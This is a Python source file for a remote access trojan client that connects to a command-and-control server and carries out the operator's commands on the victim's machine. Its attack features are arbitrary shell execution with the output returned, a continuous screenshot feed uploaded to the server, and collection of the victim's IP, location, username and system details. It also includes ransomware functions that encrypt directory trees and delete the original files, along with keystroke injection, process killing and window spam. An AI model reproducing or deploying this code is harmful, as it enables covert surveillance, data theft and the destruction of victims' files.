import socketio
from time import sleep
import os
import getpass
import pytz
import pyAesCrypt
from cryptography.fernet import Fernet
import tkinter as tk
import requests
try:
  import win32gui
except:
  pass
import requests
from pygame import mixer
import threading
import platform
from tkinter.simpledialog import askstring
import webbrowser
import time
import sys
import random
from datetime import datetime
import json
import getpass
import tempfile
import keyboard
from PIL import ImageGrab
import requests
import tkinter.messagebox as tkm
import tkinter#​
import subprocess
from cryptography.fernet import Fernet
import io

mouse_input_enabled = True
STORAGE_SERVER = 'https://storageserver.posydon.repl.co'
MAIN_SERVER = 'https://dumbledoor.posydon.repl.co'
TOKEN = 'f056c72b2110f7'

#lmao
class Noose():
  global alive
  def __init__(self, ):
    self.suicide_thread = None

  def tie(self):
    self.suicide_thread = threading.Thread(target=self.kms)

  def use(self):
    self.suicide_thread.start()

  def kms(self):
    global alive
    alive = False
    sleep(2)
    sys.exit()
  
key = 'wlVASGfwMrf7tmufVi_WXPe9ODIfwCKacx7uQnQcGpc='
key_aes = 'HBdP@$zLqnHjR%TZ2#A&&Tv9%UyLojD7197NHlc*D7xtA%'
count = 0
alive = True
sio = socketio.Client() #conecting to server
sio.connect(MAIN_SERVER, wait_timeout = 10)

#reading file with snape client identification
try:
  with open('id.txt', 'r') as file:
    snape_id = file.read()
except:
  with open('id.txt', 'w') as file:
    id_temp = ''
    for i in range(0, 10):
      id_temp+=str(random.randint(0, 9))+";"
      
    file.write(id_temp)
    snape_id = id_temp
  file.close()

#start socketio client event handlers:

#handler for basic connection
@sio.on('connect')
def on_connect():
  print('Connected to server')

#debug handler
@sio.on('message')
def on_my_response(data): 
  print('Received from server: ', data)

#handler for shell commands
@sio.on('shell')
def shell(data):
  if data['id'] == snape_id:
    try:
      output = subprocess.check_output(data['command'], shell=True)
      output_str = output.decode('utf-8')
      sio.emit('response', data={'output': output_str, 'command': data['command'], 'id': snape_id, 'api': str(data['api'])})
    except Exception as e:
      sio.emit('response', data={'output': str(e)+"\n'Bad Dobby! Bad Dobby!'", 'command': data['command'], 'id': snape_id, 'api': str(data['api'])}) 

#handler for curses
@sio.on('command')
def command(data):
  print(data)
  if data['id'] == snape_id:
    command = data['command']
    try:
      param1 = data['param1']
    except:
      param1 = None
    try:
      param2 = data['param2']
    except:
      param2 = None
    try:
      param3 = data['param3']
    except:
      param3 = None
    try:
      param4 = data['param4']
    except:
      param4 = None
    api = data['api']
      
    for i in range(0, int(data['repeat'])):
      execution_thread = threading.Thread(target=execute, args=[command, param1, param2, param3, param4, api], daemon=True)
      execution_thread.start()

#End socketio event client handlers, start curse sorting and execution
def execute(command, param1, param2, param3, param4, api):
  match command:
    case 'msgbox':
      dobby69(command, api)
      msg(param1, param2, param3, api)
      
    case 'suicide':
      print('suiciding')
      
      new_noose = Noose()
      new_noose.tie()
      new_noose.use()

    case 'screen-feed':
      screen_thread = threading.Thread(target = send_screenshot, daemon=True)
      screen_thread.start()
      
    case 'screenshot':
      screenshot()

    case 'sound':
      sound_thread = threading.Thread(target=play_sound, daemon=True)
      sound_thread.start()

    case 'dio':
      dobby69(command, api)
      diologue_top(param1, param2, api)

    case 'keyboard-write':
      keyboard_write(param1)
    
    case 'keyboard-send':
      keyboard_send(param1)

    case 'keyboard-message':
      print('message')
      write_message(text=param1, delay=param2, save=eval(param3), name=param4)

    case 'temp':
      temp()

    case 'open_url':
      url_open(param1)

    case 'hydra':
      hydra()
    
    case 'taskkill':
      kill_process(param1)

    case 'encrypt':
      encrypt(param1)

    case 'decrypt':
      decrypt(param1)

#End curse sorting, start dumbledoor server-communication functions
      
#this function is for responses that take an arbitrary time
#to send data, are sent to server log to not disrupt 
#dumbledoor terminal
def send_log(data):
  sio.emit('log', data={'content': data})

def dobby69(command, api): #arbitrary time response warning (dobby 69 response code)
  sio.emit('response', data={'output': 'dobby 69', 'command': command, 'id': snape_id, 'api': str(api)})
#for sending data that will be delivered speedily
#and does not risk disrupting dumbledoor terminal
def respond(data, api):
  sio.emit('response', data={'output': data, 'api': str(api)})

#End communication functions, start main curse function definitions:
#Functions for ransomware:
def parse(directory_to_parse):
    global files_found
    for file_name in os.listdir(directory_to_parse):
        path = os.path.join(directory_to_parse, file_name)
        if file_name == str(sys.argv[0]) or file_name == "decryptor v2.2.py":
          continue
        
        if os.path.isfile(path):
          files.append(path)
          send_log('-' * 80)
          send_log(f"[{file_name}]--file found (fernet)")
          files_found+=1
        else:
          send_log(f"[{path}]--dir found (fernet)")
            
          found_folder=f"{directory_to_parse}" + "/" + f"{file_name}"
            
          parse(found_folder)

def walk(dir, op):
  #returning a list containing the names of the entries in the directory given by path
  for name in os.listdir(dir):
    path = os.path.join(dir, name) #combining the directory and the file name to create an absolute path to the file
    if os.path.isfile(path): #check if {path} variable leads to a file is a file
      if op == 'encrypt':
          aes_crypt(path) #calling crypt function
      if op == 'decrypt':
        aes_decrypt(path)
    else:
      walk(path, op) #if it is not a file, keep going

def aes_crypt(file):
  send_log('-' * 80)
  #defining password and buffer size
  password = key_aes #after running setup.py, this file will be created with the password that you inputed there instead of this.
  buffer_size = 512 * 1024 #524288
  #Encrypting with password defined in setup.py
  pyAesCrypt.encryptFile(str(file), str(file) + ".vault", password, buffer_size)
  send_log("[Encrypt] '"+str(file)+".vault' (aes)")
  #removing original file
  os.remove(file)

def encrypt_fernet(target_dir):
  global chdir, files, files_found, files_read, files_encrypted, errors
  sys.setrecursionlimit(10000)
  print(os.getcwd())
  chdir=target_dir
  os.chdir(target_dir)
  files=[]
  files_found = 0
  files_read = 0
  files_encrypted = 0
  errors = 0
  parse(target_dir)
  for file in files:
    with open(file, "rb") as thefile:
      try:
        contents = thefile.read()
        send_log('-' * 80)
        send_log(f"[{thefile}]--reading")
        files_read+=1
      except:
        send_log('-' * 80)
        send_log(f"[{thefile}]--error reading")
        errors+=1

      try:
        contents_encrypted = Fernet(key).encrypt(contents)
        send_log('-' * 80)
        send_log(f"[{thefile}]--encrypting")
        files_encrypted+=1
      except Exception as e:
        errors+=1
        send_log('-' * 80)
        send_log(f"[{thefile}]--error reading")
        send_log(e)

    with open(file, "wb") as thefile:
      try:
        thefile.write(contents_encrypted)
      except Exception as e:
        send_log('-' * 80)
        send_log(f"[{thefile}]--error writing to file")
        errors+=1
        send_log(e)
  send_log(f'''
  {'-'*80}
  {'-'*80}
  FERNET ENCRYPTION PROCESS COMPLETED:
  [REPORT]
  Files Found...............{files_found}
  Files Read................{files_read}
  Files Encrypted...........{files_encrypted}
  Errors Encountered........{errors}
  ''')


def decrypt_fernet(target_dir):
  global chdir, files, files_found, files_read, files_decrypted, errors
  sys.setrecursionlimit(10000)
  print(os.getcwd())
  chdir=target_dir
  os.chdir(target_dir)
  files=[]
  files_found = 0
  files_read = 0
  files_decrypted = 0
  errors = 0
  parse(target_dir)
  for file in files:
    with open(file, "rb") as thefile:
      try:
        contents = thefile.read()
        send_log('-' * 80)
        send_log(f"[{thefile}]--reading (fernet)")
        files_read+=1
      except:
        send_log('-' * 80)
        send_log(f"[{thefile}]--error reading (fernet)")
        errors+=1

      try:
        contents_decrypted = Fernet(key).decrypt(contents)
        send_log('-' * 80)
        send_log(f"[{thefile}]--decrypting (fernet)")
        files_decrypted+=1
      except Exception as e:
        errors+=1
        send_log('-' * 80)
        send_log(f"[{thefile}]--error reading (fernet)")
        send_log(e)

    with open(file, "wb") as thefile:
      try:
        thefile.write(contents_decrypted)
      except Exception as e:
        send_log('-' * 80)
        send_log(f"[{thefile}]--error writing to file (fernet)")
        errors+=1
        send_log(e)
  send_log(f'''
  {'-'*80}
  {'-'*80}
  FERNET DECRYPTION PROCESS COMPLETED:
  [REPORT]
  Files Found...............{files_found}
  Files Read................{files_read}
  Files Decrypted...........{files_decrypted}
  Errors Encountered........{errors}
  ''')

def aes_decrypt(file):
  print('-' * 80)
  password = key_aes 
  buffer_size = 512 * 1024 
  try:
    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, buffer_size)
    send_log("[Decrypt] '"+str(file)+".vault' (aes)")
  except Exception as e:
    send_log(e)
  os.remove(file)

def encrypt(target_dir):
  encrypt_fernet(target_dir)
  walk(target_dir, 'encrypt')

def decrypt(target_dir):
  send_log('decrypting')
  walk(target_dir, 'decrypt')
  send_log('aes complete')
  decrypt_fernet(target_dir)

def url_open(url):
  webbrowser.open(url)
  
def wait_keyboard():
  for i in range(150):
    keyboard.block_key(i) 
    
def play_music(file):
  mixer.init()
  mixer.music.load(file)
  mixer.music.play()
  return 1
  
def main_window():
  global count
  root = tk.Tk()
  root.title(f"Hydra | {count}")
  root.geometry("300x200")
  root.protocol("WM_DELETE_WINDOW", on_closing)
  root.config(bg="black")
  label = tk.Label(root, text="Hydra - cut off one head and 5 more will appear", bg="black", fg="green")
  label.place(relx = 0.5, rely = 0.5, anchor = tk.CENTER)
  root.mainloop()

def on_closing():
  global count
  for i in range(0, 5):
    count+=1
    thread = threading.Thread(target = main_window, daemon=True)
    thread.start()

def hydra():
  main_window()

def kill_process(process):
  try:
    subprocess.call(f"taskkill /F /IM {process}", shell=True)
  except Exception as e:
    respond(str(e), False)
    
def play_sound():
  print('gonna play')
  response = requests.get(f"{MAIN_SERVER}/mp3")
  print(f"downloaded with code {response.status_code}")
  if response.status_code == 200:
    with open('file.mp3', 'wb') as f:
      f.write(response.content)
      print(f'{snape_id}: File downloaded successfully')
  else:
    print(f'{snape_id}: Failed to download file')
  print(f"mp3 file played with exit code: {play_music('file.mp3')}")
  os.remove('file.mp3')

def temp():
  os.chdir(tempfile.gettempdir())

def send_screenshot():
  global snape_id
  while True:
    # Capture a screenshot of the screen
    screenshot = ImageGrab.grab()

    # Convert the screenshot to JPEG format
    buffer = io.BytesIO()
    screenshot.save(buffer, 'JPEG', quality=80)
    buffer.seek(0)

    # Create a file-like object from the buffer
    file_data = {'file': buffer}
    params = {'id': snape_id}
    # Send the file to the server
    response = requests.post(f'{MAIN_SERVER}/screen-feed', files=file_data, params=params)

    if response.status_code == 200:
      print('File saved successfully on the server.')
    else:
      print('Failed to save file on the server.')

    # Wait for a short period of time before capturing the next screenshot
    sleep(0.01)

def diologue_top(title, message, api):
  global snape_id
  sio.emit('response', data={'output': 'dobby 69', 'id': snape_id, 'api': 'True'})
  root = tkinter.Tk()
  root.wm_attributes('-topmost', 1)
  root.withdraw()
  prompt = askstring(title, message, parent=root)
  send_log(f"user response: {prompt}")
  output = f'\n\tmessage: {message}\n\ttitle:{title}\n\tresponse: {prompt}'
  sio.emit('response', data={'output': output, 'id': snape_id, 'api': api})
  root.destroy()

def keyboard_write(text):
  keyboard.write(text, delay=0.2)

def keyboard_send(shortcut):
  keyboard.send(shortcut)

def write_message(text, delay, save=False, name="README", editor="notepad"):
  os.system("START " + editor)
  sleep(0.4)  # Wait for Notepad to open
  notepad_handle = win32gui.FindWindow(None, "Untitled - Notepad")  # Find the handle of the Notepad window
  win32gui.SetForegroundWindow(notepad_handle)  # Set Notepad window to foreground
  keyboard.write(text, delay=float(delay))
  if save:
    keyboard.send("ctrl+s")
    sleep(0.5)
    keyboard.write(name)
    keyboard.send("enter")
  else:
    pass

def screenshot():
  global snape_id
  try:
    print('screenshot')
    screenshot = ImageGrab.grab()
    screenshot.save('shot.png')
    with open('shot.png', 'rb') as image_file:
      response = requests.post(f'{MAIN_SERVER}/upload', files={'image': image_file})
      send_log(f"server response to screenshot upload: {response}")
    os.remove('shot.png')
  except Exception as e:
    send_log(f'screenshot failed, with exception as follows: \n {e}')

def msg(title, message, type, api):
  global snape_id
  try:
    root = tkinter.Tk()
    root.wm_attributes('-topmost', 1)
    root.withdraw()
    if type == 'error':
      tkm.showerror(title, message, parent=root)
    elif type == 'info':
      tkm.showinfo(title, message, parent=root)
    elif type == 'warning':
      tkm.showwarning(title, message, parent=root)
    root.destroy()
    send_log(f"client {snape_id} closed messagebox>[\n\ttype: {type}\n\ttitle: {title}\n\tmessage: {message}\n]")
  except Exception as e:
    sio.emit('response', data={'output': f"error: {e}", 'api': api})

def open_url(url):
  webbrowser.open(url, 2, True)
#End main curse functions, start information harvesting for check in loop

url = f'http://ipinfo.io/json?token={TOKEN}'
response_ipinfo = eval(requests.get(url, headers = {'User-agent': f'snape@{snape_id}'}).text)
ip = requests.get('https://api.ipify.org').content.decode('utf8')
data = response_ipinfo

city = data['city'].replace(' ', '_')
country = data['country'].replace(' ', '_')
region = data['region'].replace(' ', '_')
longitude = data['loc'].split(',')[0]
latitude = data['loc'].split(',')[1]
postal = data['postal']
timezone = data['timezone']
system = platform.system()
release = platform.release()
version = platform.version()
username = getpass.getuser()
#end info harvesting, begin check-in loop
while alive:
  tz_NY = pytz.timezone('America/New_York')
  datetime_NY = datetime.now(tz_NY)
  time = datetime_NY.strftime('%H:%M:%S')
  
  data_dict = {'id':str(snape_id), 'username': username, 'ip': str(ip), 'timezone': str(tz_NY), 'time': str(time), 'system': str(system), 'release': str(release), 'version': str(version), 'city': str(city), 'country': str(country), 'region': str(region), 'longitude': str(longitude), 'latitude': str(latitude), 'postal': str(postal)}
  try:
    sio.emit('check_in', data_dict)
    print('sent')
  except:
    print('failed to send')
  sleep(2)
